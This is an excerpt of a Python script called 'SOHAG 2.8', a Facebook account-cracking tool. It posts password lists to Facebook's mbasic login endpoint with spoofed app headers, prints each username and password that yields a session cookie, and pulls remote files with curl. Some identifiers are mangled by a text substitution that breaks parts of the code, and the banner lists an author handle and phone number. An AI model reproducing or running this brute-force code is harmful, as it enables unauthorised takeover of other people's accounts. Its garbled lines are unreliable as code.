...
r1=requests.get("https://github.com/Ayesha𝐒𝐎𝐇𝐀𝐆/File1/blob/main/ApprovemXD.txt").text
...
if not os.path.isfile('.agents.txt'):
	...
	os.system('curl -L https://github.com/MARKSINGH1/𝐒𝐎𝐇𝐀𝐆.py.git/files/main/.agents.txt > .agents.txt')
...
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-qu𝐒𝐎𝐇𝐀𝐆ty': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
...
def main():
	...
	print("\033[1;92m\t│\033[1;92mWELLCOME TO 𝐒𝐎𝐇𝐀𝐆 2.8     \033[1;92m      │")
	...
	if Adi in ('3', '03'):
		...
		os.system("xdg-open https://www.facebook.com/Musicvideopage1?mibextid=ZbWKwL")
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36m𝐒𝐎𝐇𝐀𝐆\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		...
		for pw in _sempak_:
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/v𝐒𝐎𝐇𝐀𝐆date-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)

			if 'c_user' in ses.cookies.get_dict():

				print('\r\033[1;37m[\033[1;32m𝐒𝐎𝐇𝐀𝐆-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
	...
	def __pler__(self):
		...
		if yan == '':
			...
			print('\033[1;37m[+]\033[1;36m𝐒𝐎𝐇𝐀𝐆 PROCESS HAS BEEN STARTED')
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36m𝐒𝐎𝐇𝐀𝐆\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
...
banner = """   
 ...
 .d8888b.   .d88888b.  888    888        d8888  .d8888b.       

d88P  Y88b d88P" "Y88b 888    888       d88888 d88P  Y88b      

Y88b.      888     888 888    888      d88P888 888    888      

 "Y888b.   888     888 8888888888     d88P 888 888             

    "Y88b. 888     888 888    888    d88P  888 888  88888      

      "888 888     888 888    888   d88P   888 888    888      

Y88b  d88P Y88b. .d88P 888    888  d8888888888 Y88b  d88P      

 "Y8888P"   "Y88888P"  888    888 d88P     888  "Y8888P88 

=================================================

    [-] AUTHOR    :\033[1;32m 𝐒𝐎𝐇𝐀𝐆

    [-] GITHUB    :\033[1;32m Kobir2018

    [-] WhatsApp  :\033[1;32m 01849127514
